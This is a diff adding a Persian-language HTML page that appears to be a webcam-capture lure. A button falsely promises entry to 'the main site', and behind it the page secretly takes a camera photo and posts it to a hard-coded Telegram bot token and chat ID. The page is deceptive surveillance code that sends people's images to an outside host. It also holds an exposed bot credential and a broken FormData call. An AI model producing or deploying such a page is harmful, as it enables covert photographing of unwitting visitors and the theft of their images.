@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>سایت ساده برای ارسال عکس به تلگرام</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f4f4f4;
+    }
+    button {
+      padding: 20px;
+      font-size: 18px;
+      cursor: pointer;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <button id="captureButton">برای ورود به سایت اصلی کلیک کنید</button>
+  
+  <video id="videoElement" width="320" height="240" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const captureButton = document.getElementById('captureButton');
+    const video = document.getElementById('videoElement');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    
+    // درخواست دسترسی به وب‌کم
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+      })
+      .catch(err => console.error("خطا در دسترسی به وب‌کم: ", err));
+    
+    // هنگام کلیک روی دکمه
+    captureButton.addEventListener('click', () => {
+      video.style.display = 'block';  // نمایش وب‌کم
+      captureButton.style.display = 'none';  // پنهان کردن دکمه
+
+      // پس از 3 ثانیه از وب‌کم عکس بگیریم
+      setTimeout(() => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        const photo = canvas.toDataURL('image/jpeg');
+        
+        // ارسال عکس به ربات تلگرام
+        sendToTelegram(photo);
+      }, 3000); // بعد از 3 ثانیه عکس می‌گیریم
+    });
+
+    function sendToTelegram(photo) {
+      const botToken = '8007604782:AAFBW5oKYEDE2HZHhry7uenKGiZVdOrcFg8';
+      const chatId = '1426493835';
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: new FormData().append('photo', photo).append('chat_id', chatId)
+      })
+      .then(response => response.json())
+      .then(data => console.log('عکس ارسال شد:', data))
+      .catch(error => console.error('خطا در ارسال عکس:', error));
+    }
+  </script>
+
+</body>
+</html>
